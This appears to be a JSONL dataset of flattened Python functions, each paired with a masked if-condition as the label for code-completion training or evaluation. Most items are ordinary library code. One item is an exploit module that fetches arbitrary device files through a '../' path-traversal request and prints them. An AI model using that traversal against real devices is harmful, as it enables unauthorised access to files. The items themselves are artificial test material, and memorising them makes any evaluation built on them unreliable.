{"input": "def update(self, data): results = [] while True: remain = BLOCK_SIZE - self._pos cur_data = data[:remain] cur_data_len = len(cur_data) cur_stream = self._stream[self._pos : self._pos + cur_data_len] self._pos = self._pos + cur_data_len data = data[remain:] results.append(numpy_xor(cur_data, cur_stream)) if self._pos >= BLOCK_SIZE: self._next_stream() self._pos = 0 if not data: break return b\"\".join(results)", "label": "if not data :"}
{"input": "def listed(output, pool): for line in output.splitlines(): name, mountpoint, refquota = line.split(b\"\\t\") name = name[len(pool) + 1 :] if name: refquota = int(refquota.decode(\"ascii\")) if refquota == 0: refquota = None yield _DatasetInfo(dataset=name, mountpoint=mountpoint, refquota=refquota)", "label": "if refquota == 0 :"}
{"input": "def set_multi(self, value): del self[atype] for addr in value: # Support assigning dictionary versions of addresses # instead of full Address objects. if not isinstance(addr, Address): if atype != \"all\": addr[\"type\"] = atype elif \"atype\" in addr and \"type\" not in addr: addr[\"type\"] = addr[\"atype\"] addrObj = Address() addrObj.values = addr addr = addrObj self.append(addr)", "label": "if not isinstance ( addr , Address ) :"}
{"input": "def get_migration_rate(volume): metadata = get_metadata(volume) rate = metadata.get(\"migrate_rate\", None) if rate: if rate.lower() in storops.VNXMigrationRate.values(): return storops.VNXMigrationRate.parse(rate.lower()) else: LOG.warning( \"Unknown migration rate specified, \" \"using [high] as migration rate.\" ) return storops.VNXMigrationRate.HIGH", "label": "if rate . lower ( ) in storops . VNXMigrationRate . values ( ) :"}
{"input": "def _check_params(self) -> None: if self.augmentation and self.ratio <= 0: raise ValueError(\"The augmentation ratio must be positive.\") if self.clip_values is not None: if len(self.clip_values) != 2: raise ValueError( \"`clip_values` should be a tuple of 2 floats or arrays containing the allowed data range.\" ) if np.array(self.clip_values[0] >= self.clip_values[1]).any(): raise ValueError(\"Invalid `clip_values`: min >= max.\")", "label": "if np . array ( self . clip_values [ 0 ] >= self . clip_values [ 1 ] ) . any ( ) :"}
{"input": "def _find_first_unescaped(dn, char, pos): while True: pos = dn.find(char, pos) if pos == -1: break # no char found if pos > 0 and dn[pos - 1] != \"\\\\\": # unescaped char break elif pos > 1 and dn[pos - 1] == \"\\\\\": # may be unescaped escaped = True for c in dn[pos - 2 : 0 : -1]: if c == \"\\\\\": escaped = not escaped else: break if not escaped: break pos += 1 return pos", "label": "if not escaped :"}
{"input": "def get_objects(self): retval = [] for item in self._obj_list: if item is None: continue target = pickle.loads(item)[0] _class = map2class(target) if _class: obj = _class(self._dbstate, item) if obj: retval.append(obj) return retval", "label": "if obj :"}
{"input": "def get_databases(request): dbs = {} for (key, value) in global_env.items(): try: cond = isinstance(value, GQLDB) except: cond = isinstance(value, SQLDB) if cond: dbs[key] = value return dbs", "label": "if cond :"}
{"input": "def real_quick_ratio(buf1, buf2): try: if buf1 is None or buf2 is None or buf1 == \"\" or buf1 == \"\": return 0 s = SequenceMatcher(None, buf1.split(\"\\n\"), buf2.split(\"\\n\")) return s.real_quick_ratio() except: print(\"real_quick_ratio:\", str(sys.exc_info()[1])) return 0", "label": "if buf1 is None or buf2 is None or buf1 == \"\" or buf1 == \"\" :"}
{"input": "def SentSegRestoreSent( batch_words: List[List[str]], batch_tags: List[List[str]] ) -> List[str]: ret = [] for words, tags in zip(batch_words, batch_tags): if len(tags) == 0: ret.append(\"\") continue sent = words[0] punct = \"\" if tags[0] == \"O\" else tags[0][-1] for word, tag in zip(words[1:], tags[1:]): if tag != \"O\": sent += punct punct = tag[-1] sent += \" \" + word sent += punct ret.append(sent) return ret", "label": "if tag != \"O\" :"}
{"input": "def build(opt): dpath = os.path.join(opt[\"datapath\"], \"MultiNLI\") version = \"1.0\" if not build_data.built(dpath, version_string=version): print(\"[building data: \" + dpath + \"]\") if build_data.built(dpath): # an older version exists, so remove these outdated files. build_data.remove_dir(dpath) build_data.make_dir(dpath) # Download the data. for downloadable_file in RESOURCES: downloadable_file.download_file(dpath) # mark the data as built build_data.mark_done(dpath, version_string=version)", "label": "if build_data . built ( dpath ) :"}
{"input": "def __iter__(self): iteration = self.start_iter while iteration <= self.num_iterations: # if the underlying sampler has a set_epoch method, like # DistributedSampler, used for making each process see # a different split of the dataset, then set it if hasattr(self.batch_sampler.sampler, \"set_epoch\"): self.batch_sampler.sampler.set_epoch(iteration) for batch in self.batch_sampler: iteration += 1 if iteration > self.num_iterations: break yield batch", "label": "if iteration > self . num_iterations :"}
{"input": "def visit_title(self, node: Element) -> None: if isinstance(node.parent, addnodes.seealso): self.body.append('.IP \"') return elif isinstance(node.parent, nodes.section): if self.section_level == 0: # skip the document title raise nodes.SkipNode elif self.section_level == 1: self.body.append(\".SH %s\\n\" % self.deunicode(node.astext().upper())) raise nodes.SkipNode return super().visit_title(node)", "label": "elif self . section_level == 1 :"}
{"input": "def validate_feature_query_fields(namespace): if namespace.fields: fields = [] for field in namespace.fields: for feature_query_field in FeatureQueryFields: if field.lower() == feature_query_field.name.lower(): fields.append(feature_query_field) namespace.fields = fields", "label": "if field . lower ( ) == feature_query_field . name . lower ( ) :"}
{"input": "def __init__(self, clock_pin, mosi_pin, miso_pin): self.lock = None self.clock = None self.mosi = None self.miso = None super(SPISoftwareBus, self).__init__() self.lock = RLock() self.clock_phase = False self.lsb_first = False self.bits_per_word = 8 try: self.clock = OutputDevice(clock_pin, active_high=True) if mosi_pin is not None: self.mosi = OutputDevice(mosi_pin) if miso_pin is not None: self.miso = InputDevice(miso_pin) except: self.close() raise", "label": "if miso_pin is not None :"}
{"input": "def sample_neg_items_for_u(u, num): # sample num neg items for u-th user neg_items = [] while True: if len(neg_items) == num: break neg_id = np.random.randint(low=0, high=self.n_items, size=1)[0] if neg_id not in self.train_items[u] and neg_id not in neg_items: neg_items.append(neg_id) return neg_items", "label": "if neg_id not in self . train_items [ u ] and neg_id not in neg_items :"}
{"input": "def _write_dump(self, command, output): if isinstance(self, HostDumper): prefix = \"host\" elif isinstance(self, TargetDumper): prefix = \"target\" else: prefix = \"unknown\" for i in itertools.count(): filename = \"%s_%02d_%s\" % (prefix, i, command) fullname = os.path.join(self.dump_dir, filename) if not os.path.exists(fullname): break with open(fullname, \"w\") as dump_file: dump_file.write(output)", "label": "if not os . path . exists ( fullname ) :"}
{"input": "def match_style(self, vmobject, recurse=True): self.set_style(**vmobject.get_style(), recurse=False) if recurse: # Does its best to match up submobject lists, and # match styles accordingly submobs1, submobs2 = self.submobjects, vmobject.submobjects if len(submobs1) == 0: return self elif len(submobs2) == 0: submobs2 = [vmobject] for sm1, sm2 in zip(*make_even(submobs1, submobs2)): sm1.match_style(sm2) return self", "label": "if len ( submobs1 ) == 0 :"}
{"input": "def close_cb(self, worker): try: self.workers.remove(worker) if worker.version == \"2\": self.h2_num -= 1 else: self.h1_num -= 1 except: pass", "label": "if worker . version == \"2\" :"}
{"input": "def wait_for_syn(jid): i = 0 while 1: if i > 60: error( \"!!!WAIT FOR ACK TIMEOUT: job:%r fd:%r!!!\", jid, self.synq._reader.fileno(), exc_info=1, ) req = _wait_for_syn() if req: type_, args = req if type_ == NACK: return False assert type_ == ACK return True i += 1", "label": "if i > 60 :"}
{"input": "def send_log(self, session: aiohttp.ClientSession, request_dict: Dict[str, Any]): async with session.request( request_dict[\"method\"], request_dict[\"url\"], **request_dict[\"request_obj\"] ) as resp: resp_text = await resp.text() self.logger().debug( f\"Sent logs: {resp.status} {resp.url} {resp_text} \", extra={\"do_not_send\": True}, ) if resp.status != 200 and resp.status not in {404, 405, 400}: raise EnvironmentError(\"Failed sending logs to log server.\")", "label": "if resp . status != 200 and resp . status not in { 404 , 405 , 400 } :"}
{"input": "def _close_files(self, except_index=None): for tab_index in reversed(range(len(self.winfo_children()))): if except_index is not None and tab_index == except_index: continue else: editor = self.get_child_by_index(tab_index) if self.check_allow_closing(editor): self.forget(editor) editor.destroy()", "label": "if self . check_allow_closing ( editor ) :"}
{"input": "def get_sorted_entry(field, bookid): if field == \"title\" or field == \"authors\": book = calibre_db.get_filtered_book(bookid) if book: if field == \"title\": return json.dumps({\"sort\": book.sort}) elif field == \"authors\": return json.dumps({\"author_sort\": book.author_sort}) return \"\"", "label": "if book :"}
{"input": "def listdir(path=\".\"): is_bytes = isinstance(path, bytes) res = [] for dirent in ilistdir(path): fname = dirent[0] if is_bytes: good = fname != b\".\" and fname == b\"..\" else: good = fname != \".\" and fname != \"..\" if good: if not is_bytes: fname = fsdecode(fname) res.append(fname) return res", "label": "if good :"}
{"input": "def image_preprocess(self, image): with tf.name_scope(\"image_preprocess\"): if image.dtype.base_dtype != tf.float32: image = tf.cast(image, tf.float32) mean = [0.485, 0.456, 0.406] # rgb std = [0.229, 0.224, 0.225] if self.image_bgr: mean = mean[::-1] std = std[::-1] image_mean = tf.constant(mean, dtype=tf.float32) * 255.0 image_std = tf.constant(std, dtype=tf.float32) * 255.0 image = (image - image_mean) / image_std return image", "label": "if self . image_bgr :"}
{"input": "def eval_when(when): if hasattr(when, \"isatty\") or when in ( \"always\", \"never\", \"auto\", sys.stderr, sys.stdout, ): if when == \"always\": return True elif when == \"never\": return False elif when == \"auto\": return sys.stdout.isatty() else: return when.isatty() else: raise ValueError( 'text.when: must be a file-object or \"always\", \"never\" or \"auto\"' )", "label": "if when == \"always\" :"}
{"input": "def _get_plugin(self, name, lang=None, check=False): if lang is None: lang = self.get_lang() if name not in self.plugin_attrib_map: return None plugin_class = self.plugin_attrib_map[name] if plugin_class.is_extension: if (name, None) in self.plugins: return self.plugins[(name, None)] else: return None if check else self.init_plugin(name, lang) else: if (name, lang) in self.plugins: return self.plugins[(name, lang)] else: return None if check else self.init_plugin(name, lang)", "label": "if ( name , lang ) in self . plugins :"}
{"input": "def _remove_pending_resource(self, resource, res_id): with self._lock: pending_resources = self.pending_resources.get(res_id, []) for i, pending_resource in enumerate(pending_resources): if pending_resource.resource == resource: pending_resources.pop(i) break if not pending_resources: self.pending_resources.pop(res_id, None) return res_id", "label": "if pending_resource . resource == resource :"}
{"input": "def assign_attributes_to_products(product_attributes): for value in product_attributes: pk = value[\"pk\"] defaults = value[\"fields\"] defaults[\"product_id\"] = defaults.pop(\"product\") defaults[\"assignment_id\"] = defaults.pop(\"assignment\") assigned_values = defaults.pop(\"values\") assoc, created = AssignedProductAttribute.objects.update_or_create( pk=pk, defaults=defaults ) if created: assoc.values.set(AttributeValue.objects.filter(pk__in=assigned_values))", "label": "if created :"}
{"input": "def recv_full(self, n): r = b\"\" while len(r) < n: rr = self.conn.recv(n - len(r)) if not rr: raise IOError(\"need %d bytes, got %d\", n, len(r)) r += rr return r", "label": "if not rr :"}
{"input": "def get_logsource(self, category, product, service): \"\"\"Return merged log source definition of all logosurces that match criteria across all Sigma conversion configurations in chain.\"\"\" matching = list() for config in self: for logsource in config.logsources: if logsource.matches(category, product, service): matching.append(logsource) if logsource.rewrite is not None: category, product, service = logsource.rewrite return SigmaLogsourceConfiguration(matching, self.defaultindex)", "label": "if logsource . matches ( category , product , service ) :"}
{"input": "def test_circuit_structure(): ops = cirq.decompose_cphase_into_two_fsim(cirq.CZ, fsim_gate=cirq.google.SYC) num_interaction_moments = 0 for op in ops: assert len(op.qubits) in (0, 1, 2) if len(op.qubits) == 2: num_interaction_moments += 1 assert isinstance(op.gate, cirq.google.SycamoreGate) assert num_interaction_moments == 2", "label": "if len ( op . qubits ) == 2 :"}
{"input": "def verify_installed_repositories( self, installed_repositories=[], uninstalled_repositories=[] ): for repository_name, repository_owner in installed_repositories: galaxy_repository = test_db_util.get_installed_repository_by_name_owner( repository_name, repository_owner ) if galaxy_repository: assert ( galaxy_repository.status == \"Installed\" ), \"Repository {} should be installed, but is {}\".format( repository_name, galaxy_repository.status )", "label": "if galaxy_repository :"}
{"input": "def set_size_for_text(self, width, nlines=1): if width is not None: font = self.font d = 2 * self.margin if isinstance(width, basestring): width, height = font.size(width) width += d + 2 else: height = font.size(\"X\")[1] self.size = (width, height * nlines + d)", "label": "if isinstance ( width , basestring ) :"}
{"input": "def splitIntoWords(name): wordlist = [] wordstart = 0 l = len(name) for i in range(l): c = name[i] n = None if c == \" \" or c == \"-\": n = name[wordstart:i] elif i == l - 1: n = name[wordstart : i + 1] if n: wordstart = i if c == \"-\" and n != \"\": n += \"-\" if c == \" \" or c == \"-\": wordstart = i + 1 wordlist.append(n) return wordlist", "label": "if c == \" \" or c == \"-\" :"}
{"input": "def _parse(self): import yaml # somewhat expensive try: f = open(self.path, \"r\") except IOError as e: if e.errno != 2: # file not found log.warning(\"cannot read user config in %s: %s\", self.path, e) else: try: return yaml.safe_load(f) or {} except Exception as e: log.warning(\"error loading user config in %s: %s\", self.path, e) return {}", "label": "if e . errno != 2 :"}
{"input": "def _print_one_entry(news_entry: xml.etree.ElementTree.Element) -> None: child: xml.etree.ElementTree.Element for child in news_entry: if \"title\" in child.tag: title = str(child.text) if \"pubDate\" in child.tag: pub_date = str(child.text) if \"description\" in child.tag: description = str(child.text) print_stdout(color_line(title, 14) + \" (\" + bold_line(pub_date) + \")\") print_stdout(format_paragraph(strip_tags(description))) print_stdout()", "label": "if \"title\" in child . tag :"}
{"input": "def kth_smallest(root, k): stack = [] while root or stack: while root: stack.append(root) root = root.left root = stack.pop() k -= 1 if k == 0: break root = root.right return root.val", "label": "if k == 0 :"}
{"input": "def _strip_headers(output, *args): if not args: args_lc = ( \"installed packages\", \"available packages\", \"available upgrades\", \"updated packages\", \"upgraded packages\", ) else: args_lc = [x.lower() for x in args] ret = \"\" for line in salt.utils.itertools.split(output, \"\\n\"): if line.lower() not in args_lc: ret += line + \"\\n\" return ret", "label": "if line . lower ( ) not in args_lc :"}
{"input": "def __str__(self): if self.name is not None: return self.name else: name = str(self.data) if len(name) > 20: name = name[:10] + \"...\" + name[-10:] return \"Constant{%s}\" % name", "label": "if len ( name ) > 20 :"}
{"input": "def on_event_clicked(self, widget, event): if event.type == Gdk.EventType.BUTTON_PRESS and event.button == 3: path = self.get_path_at_pos(int(event.x), int(event.y)) if path is not None: row = self.get(path[0], \"device\") if row: if self.Blueman is not None: if self.menu is None: self.menu = ManagerDeviceMenu(self.Blueman) self.menu.popup(None, None, None, None, event.button, event.time)", "label": "if self . menu is None :"}
{"input": "def h2i(self, pkt, x): if x is not None: if x <= -180.00000005: warning(\"Fixed3_7: Input value too negative: %.8f\" % x) x = -180.0 elif x >= 180.00000005: warning(\"Fixed3_7: Input value too positive: %.8f\" % x) x = 180.0 x = int(round((x + 180.0) * 1e7)) return x", "label": "if x <= - 180.00000005 :"}
{"input": "def mFRIDAY( self, ): try: _type = FRIDAY _channel = DEFAULT_CHANNEL pass self.match(\"fri\") alt10 = 2 LA10_0 = self.input.LA(1) if LA10_0 == 100: alt10 = 1 if alt10 == 1: pass self.match(\"day\") self._state.type = _type self._state.channel = _channel finally: pass", "label": "if LA10_0 == 100 :"}
{"input": "def xopen(file): if isinstance(file, str): if file == \"-\": return sys.stdin elif file.endswith(\".gz\"): import gzip return gzip.open(file) else: return open(file) else: return file", "label": "elif file . endswith ( \".gz\" ) :"}
{"input": "def write_bytes(out_data, encoding=\"ascii\"): \"\"\"Legacy for Python2 and Python3 compatible byte stream.\"\"\" if sys.version_info[0] >= 3: if isinstance(out_data, type(\"\")): if encoding == \"utf-8\": return out_data.encode(\"utf-8\") else: return out_data.encode(\"ascii\", \"ignore\") elif isinstance(out_data, type(b\"\")): return out_data msg = \"Invalid value for out_data neither unicode nor byte string: {}\".format( out_data ) raise ValueError(msg)", "label": "if encoding == \"utf-8\" :"}
{"input": "def do_revision_view(request, *args, **kwargs): if request_creates_revision(request): try: with create_revision_base( manage_manually=manage_manually, using=using, atomic=atomic ): response = func(request, *args, **kwargs) # Check for an error response. if response.status_code >= 400: raise _RollBackRevisionView(response) # Otherwise, we're good. _set_user_from_request(request) return response except _RollBackRevisionView as ex: return ex.response return func(request, *args, **kwargs)", "label": "if response . status_code >= 400 :"}
{"input": "def testMasked(self): mask = (True, False) trainable_state = recurrent.TrainableState((tf.zeros([16]), tf.zeros([3])), mask) for var in trainable_state.trainable_variables: var.assign_add(tf.ones_like(var)) initial_state = trainable_state(batch_size=42) for s, trainable in zip(tree.flatten(initial_state), tree.flatten(mask)): if trainable: self.assertNotAllClose(s, tf.zeros_like(s)) else: self.assertAllClose(s, tf.zeros_like(s))", "label": "if trainable :"}
{"input": "def _get_instance_attribute( self, attr, default=None, defaults=None, incl_metadata=False ): if self.instance is None or not hasattr(self.instance, attr): if incl_metadata and attr in self.parsed_metadata: return self.parsed_metadata[attr] elif defaults is not None: for value in defaults: if callable(value): value = value() if value is not None: return value return default return getattr(self.instance, attr)", "label": "elif defaults is not None :"}
{"input": "def process_config(self): super(SquidCollector, self).process_config() self.squid_hosts = {} for host in self.config[\"hosts\"]: matches = self.host_pattern.match(host) if matches.group(5): port = matches.group(5) else: port = 3128 if matches.group(2): nick = matches.group(2) else: nick = port self.squid_hosts[nick] = {\"host\": matches.group(3), \"port\": int(port)}", "label": "if matches . group ( 2 ) :"}
{"input": "def get_iterator(self, training=True): if training: # In training. if self._should_reset_train_loader: self.epochs += 1 self.train_iterator = iter(self.train_loader) self._should_reset_train_loader = False return self.train_iterator else: # In validation. if self._should_reset_val_loader: self.val_iterator = iter(self.validation_loader) self._should_reset_val_loader = False return self.val_iterator", "label": "if self . _should_reset_val_loader :"}
{"input": "def _find_this_and_next_frame(self, stack): for i in range(len(stack)): if stack[i].id == self._frame_id: if i == len(stack) - 1: # last frame return stack[i], None else: return stack[i], stack[i + 1] raise AssertionError(\"Frame doesn't exist anymore\")", "label": "if i == len ( stack ) - 1 :"}
{"input": "def send_mail(success): backend = ( \"django.core.mail.backends.locmem.EmailBackend\" if success else \"tests.FailingMailerEmailBackend\" ) with self.settings(MAILER_EMAIL_BACKEND=backend): mailer.send_mail( \"Subject\", \"Body\", \"sender@example.com\", [\"recipient@example.com\"] ) engine.send_all() if not success: Message.objects.retry_deferred() engine.send_all()", "label": "if not success :"}
{"input": "def check_dependencies(): \"\"\"Ensure required tools for installation are present\"\"\" print(\"Checking required dependencies\") for dep, msg in [ ([\"git\", \"--version\"], \"Git (http://git-scm.com/)\"), ([\"wget\", \"--version\"], \"wget\"), ([\"bzip2\", \"-h\"], \"bzip2\"), ]: try: p = subprocess.Popen(dep, stderr=subprocess.STDOUT, stdout=subprocess.PIPE) out, code = p.communicate() except OSError: out = \"Executable not found\" code = 127 if code == 127: raise OSError(\"bcbio-nextgen installer requires %s\\n%s\" % (msg, out))", "label": "if code == 127 :"}
{"input": "def apply(self, chart, grammar, edge): if edge.is_incomplete(): return for prod in grammar.productions(): if edge.lhs() == prod.rhs()[0]: new_edge = ProbabilisticTreeEdge.from_production( prod, edge.start(), prod.prob() ) if chart.insert(new_edge, ()): yield new_edge", "label": "if chart . insert ( new_edge , ( ) ) :"}
{"input": "def run(self): if self.check(): path = \"/../../../../../../../../../../../..{}\".format(self.filename) response = self.http_request(method=\"GET\", path=path) if response is None: return if response.status_code == 200 and response.text: print_success(\"Success! File: %s\" % self.filename) print_info(response.text) else: print_error(\"Exploit failed\") else: print_error(\"Device seems to be not vulnerable\")", "label": "if response is None :"}
{"input": "def check_options(plugin, options): CONFLICT_OPTS = {\"Phantom\": [{\"rps_schedule\", \"instances_schedule\", \"stpd_file\"}]} for conflict_options in CONFLICT_OPTS.get(plugin, []): intersect = {option[0] for option in options} & conflict_options if len(intersect) > 1: raise OptionsConflict( \"Conflicting options: {}: {}\".format(plugin, list(intersect)) ) return plugin, options", "label": "if len ( intersect ) > 1 :"}
{"input": "def validate(self, document: Document) -> None: if not self.func(document.text): if self.move_cursor_to_end: index = len(document.text) else: index = 0 raise ValidationError(cursor_position=index, message=self.error_message)", "label": "if self . move_cursor_to_end :"}
{"input": "def download_link(request, path_obj): if path_obj.file != \"\": if path_obj.translation_project.project.is_monolingual(): text = _(\"Export\") tooltip = _(\"Export translations\") else: text = _(\"Download\") tooltip = _(\"Download file\") return { \"href\": \"%s/download/\" % path_obj.pootle_path, \"text\": text, \"title\": tooltip, }", "label": "if path_obj . translation_project . project . is_monolingual ( ) :"}
{"input": "def _setup_factories(self, extrascopes, **kw): for factory, (scope, Default) in { \"response_factory\": (boto.mws.response, self.ResponseFactory), \"response_error_factory\": (boto.mws.exception, self.ResponseErrorFactory), }.items(): if factory in kw: setattr(self, \"_\" + factory, kw.pop(factory)) else: scopes = extrascopes + [scope] setattr(self, \"_\" + factory, Default(scopes=scopes)) return kw", "label": "if factory in kw :"}
{"input": "def status_string(self): if not self.live: if self.expired: return _(\"expired\") elif self.approved_schedule: return _(\"scheduled\") elif self.workflow_in_progress: return _(\"in moderation\") else: return _(\"draft\") else: if self.approved_schedule: return _(\"live + scheduled\") elif self.workflow_in_progress: return _(\"live + in moderation\") elif self.has_unpublished_changes: return _(\"live + draft\") else: return _(\"live\")", "label": "if self . approved_schedule :"}
{"input": "def _sleep_till_stopword( caplog, delay: float, patterns: Sequence[str] = (), *, interval: Optional[float] = None, ) -> bool: patterns = list(patterns or []) delay = delay or (10.0 if patterns else 1.0) interval = interval or min(1.0, max(0.1, delay / 10.0)) started = time.perf_counter() found = False while not found and time.perf_counter() - started < delay: for message in list(caplog.messages): if any(re.search(pattern, message) for pattern in patterns): found = True break else: time.sleep(interval) return found", "label": "if any ( re . search ( pattern , message ) for pattern in patterns ) :"}
{"input": "def _parse_yum_or_zypper_repositories(output): repos = [] current_repo = {} for line in output: line = line.strip() if not line or line.startswith(\"#\"): continue if line.startswith(\"[\"): if current_repo: repos.append(current_repo) current_repo = {} current_repo[\"name\"] = line[1:-1] if current_repo and \"=\" in line: key, value = line.split(\"=\", 1) current_repo[key] = value if current_repo: repos.append(current_repo) return repos", "label": "if current_repo and \"=\" in line :"}
{"input": "def __enter__(self): with self._entry_lock: cutoff_time = datetime.datetime.now() - self._time_window # drop the entries that are too old, as they are no longer relevant while self._past_entries and self._past_entries[0] < cutoff_time: self._past_entries.popleft() if len(self._past_entries) < self._access_limit: self._past_entries.append(datetime.datetime.now()) return 0.0 # no waiting was needed to_wait = (self._past_entries[0] - cutoff_time).total_seconds() time.sleep(to_wait) self._past_entries.append(datetime.datetime.now()) return to_wait", "label": "if len ( self . _past_entries ) < self . _access_limit :"}
{"input": "def wrappper(*args, **kargs): offspring = func(*args, **kargs) for child in offspring: for i in range(len(child)): if child[i] > max: child[i] = max elif child[i] < min: child[i] = min return offspring", "label": "if child [ i ] > max :"}
{"input": "def migrate_Context(self): for old_obj in self.session_old.query(self.model_from[\"Context\"]): new_obj = self.model_to[\"Context\"]() for key in new_obj.__table__.columns._data.keys(): if key not in old_obj.__table__.columns._data.keys(): continue value = getattr(old_obj, key) if key == \"tip_timetolive\" and value < 0: value = 0 setattr(new_obj, key, value) self.session_new.add(new_obj)", "label": "if key not in old_obj . __table__ . columns . _data . keys ( ) :"}
{"input": "def fresh_workspace(self): i3 = IpcTest.i3_conn assert i3 workspaces = await i3.get_workspaces() while True: new_name = str(math.floor(random() * 100000)) if not any(w for w in workspaces if w.name == new_name): await i3.command(\"workspace %s\" % new_name) return new_name", "label": "if not any ( w for w in workspaces if w . name == new_name ) :"}
{"input": "def _sum_operation(values): values_list = list() if decimal_support: for v in values: if isinstance(v, numbers.Number): values_list.append(v) elif isinstance(v, decimal128.Decimal128): values_list.append(v.to_decimal()) else: values_list = list(v for v in values if isinstance(v, numbers.Number)) sum_value = sum(values_list) return ( decimal128.Decimal128(sum_value) if isinstance(sum_value, decimal.Decimal) else sum_value )", "label": "if isinstance ( v , numbers . Number ) :"}
{"input": "def detect(content, **kwargs): status = kwargs.get(\"status\", 0) if status is not None and status == 405: detection_schema = ( re.compile(\"error(s)?.aliyun(dun)?.(com|net)\", re.I), re.compile(\"http(s)?://(www.)?aliyun.(com|net)\", re.I), ) for detection in detection_schema: if detection.search(content) is not None: return True", "label": "if detection . search ( content ) is not None :"}
{"input": "def __gather_epoch_end_eval_results(self, outputs): eval_results = [] for epoch_output in outputs: result = epoch_output[0].__class__.gather(epoch_output) if \"checkpoint_on\" in result: result.checkpoint_on = result.checkpoint_on.mean() if \"early_stop_on\" in result: result.early_stop_on = result.early_stop_on.mean() eval_results.append(result) # with 1 dataloader don't pass in a list if len(eval_results) == 1: eval_results = eval_results[0] return eval_results", "label": "if \"checkpoint_on\" in result :"}
{"input": "def proto_library_config(append=None, **kwargs): \"\"\"protoc config.\"\"\" path = kwargs.get(\"protobuf_include_path\") if path: _blade_config.warning( \"proto_library_config: protobuf_include_path has \" \"been renamed to protobuf_incs, and become a list\" ) del kwargs[\"protobuf_include_path\"] if isinstance(path, str) and \" \" in path: kwargs[\"protobuf_incs\"] = path.split() else: kwargs[\"protobuf_incs\"] = [path] _blade_config.update_config(\"proto_library_config\", append, kwargs)", "label": "if isinstance ( path , str ) and \" \" in path :"}
{"input": "def downgrade(): bind = op.get_bind() session = db.Session(bind=bind) for slc in session.query(Slice).filter(Slice.viz_type == \"pie\").all(): try: params = json.loads(slc.params) if \"metric\" in params: if params[\"metric\"]: params[\"metrics\"] = [params[\"metric\"]] del params[\"metric\"] slc.params = json.dumps(params, sort_keys=True) except Exception: pass session.commit() session.close()", "label": "if params [ \"metric\" ] :"}
{"input": "def _resolve_params(self, api_params, optional_params, plan_vars): resolver = VariableResolver() api_params_resolved = resolver.resolve_variables(plan_vars, api_params) if optional_params is not None: optional_params_resolved = resolver.resolve_variables( plan_vars, optional_params ) for key, value in optional_params_resolved.items(): if key not in api_params_resolved and value is not None: api_params_resolved[key] = value return api_params_resolved", "label": "if key not in api_params_resolved and value is not None :"}
{"input": "def publish(self, name, stat): try: topic = \"stat.%s\" % str(name) if \"subtopic\" in stat: topic += \".%d\" % stat[\"subtopic\"] stat = json.dumps(stat) logger.debug(\"Sending %s\" % stat) self.socket.send_multipart([b(topic), stat]) except zmq.ZMQError: if self.socket.closed: pass else: raise", "label": "if self . socket . closed :"}
{"input": "def verify_packages(packages: Optional[Union[str, List[str]]]) -> None: if not packages: return if isinstance(packages, str): packages = packages.splitlines() for package in packages: if not package: continue match = RE_PATTERN.match(package) if match: name = match.group(\"name\") operation = match.group(\"operation1\") version = match.group(\"version1\") _verify_package(name, operation, version) else: raise ValueError(\"Unable to read requirement: %s\" % package)", "label": "if not package :"}
{"input": "def explode(self, obj): \"\"\"Determine if the object should be exploded.\"\"\" if obj in self._done: return False result = False for item in self._explode: if hasattr(item, \"_moId\"): # If it has a _moId it is an instance if obj._moId == item._moId: result = True else: # If it does not have a _moId it is a template if obj.__class__.__name__ == item.__name__: result = True if result: self._done.add(obj) return result", "label": "if obj . _moId == item . _moId :"}
{"input": "def iterRelativeExportCFiles(basepath): for root, dirs, files in os.walk(basepath, topdown=True): for directory in dirs: if isAddonDirectoryIgnored(directory): dirs.remove(directory) for filename in files: if not isExportCFileIgnored(filename): fullpath = os.path.join(root, filename) yield os.path.relpath(fullpath, basepath)", "label": "if not isExportCFileIgnored ( filename ) :"}
{"input": "def get_asset_gl_entry(self, gl_entries): for item in self.get(\"items\"): if item.is_fixed_asset: if is_cwip_accounting_enabled(item.asset_category): self.add_asset_gl_entries(item, gl_entries) if flt(item.landed_cost_voucher_amount): self.add_lcv_gl_entries(item, gl_entries) # update assets gross amount by its valuation rate # valuation rate is total of net rate, raw mat supp cost, tax amount, lcv amount per item self.update_assets(item, item.valuation_rate) return gl_entries", "label": "if is_cwip_accounting_enabled ( item . asset_category ) :"}
{"input": "def _check_no_tensors(parameters: Params): flat_params = tf.nest.flatten(parameters.params) for p in flat_params: if isinstance(p, Params): _check_no_tensors(p) if tf.is_tensor(p): raise TypeError( \"Saw a `Tensor` value in parameters:\\n {}\".format(parameters) )", "label": "if tf . is_tensor ( p ) :"}
{"input": "def _check_positional(results): positional = None for name, char in results: if positional is None: positional = name is None else: if (name is None) != positional: raise TranslationError( \"format string mixes positional \" \"and named placeholders\" ) return bool(positional)", "label": "if positional is None :"}
{"input": "def active_cursor(self): if self.phase == _Phase.ADJUST: if self.zone == _EditZone.CONTROL_NODE: return self._crosshair_cursor elif self.zone != _EditZone.EMPTY_CANVAS: # assume button return self._arrow_cursor return None", "label": "elif self . zone != _EditZone . EMPTY_CANVAS :"}
{"input": "def _addPending(self, path, reason, isDir=False): if path not in self.__pending: self.__pending[path] = [Utils.DEFAULT_SLEEP_INTERVAL, isDir] self.__pendingMinTime = 0 if isinstance(reason, pyinotify.Event): reason = [reason.maskname, reason.pathname] logSys.log( logging.MSG, \"Log absence detected (possibly rotation) for %s, reason: %s of %s\", path, *reason )", "label": "if isinstance ( reason , pyinotify . Event ) :"}
{"input": "def has_safe_repr(value): \"\"\"Does the node have a safe representation?\"\"\" if value is None or value is NotImplemented or value is Ellipsis: return True if isinstance(value, (bool, int, long, float, complex, basestring, xrange, Markup)): return True if isinstance(value, (tuple, list, set, frozenset)): for item in value: if not has_safe_repr(item): return False return True elif isinstance(value, dict): for key, value in value.iteritems(): if not has_safe_repr(key): return False if not has_safe_repr(value): return False return True return False", "label": "if not has_safe_repr ( key ) :"}
{"input": "def refund_balances(self): from liberapay.billing.transactions import refund_payin payins = self.get_refundable_payins() for exchange in payins: balance = self.get_balance_in(exchange.amount.currency) if balance == 0: continue amount = min(balance, exchange.refundable_amount) status, e_refund = refund_payin(self.db, exchange, amount, self) if status != \"succeeded\": raise TransferError(e_refund.note)", "label": "if balance == 0 :"}
{"input": "def balanced_tokens_across_dcs(self, dcs): tokens = [] current_dc = dcs[0] count = 0 dc_count = 0 for dc in dcs: if dc == current_dc: count += 1 else: new_tokens = [tk + (dc_count * 100) for tk in self.balanced_tokens(count)] tokens.extend(new_tokens) current_dc = dc count = 1 dc_count += 1 new_tokens = [tk + (dc_count * 100) for tk in self.balanced_tokens(count)] tokens.extend(new_tokens) return tokens", "label": "if dc == current_dc :"}
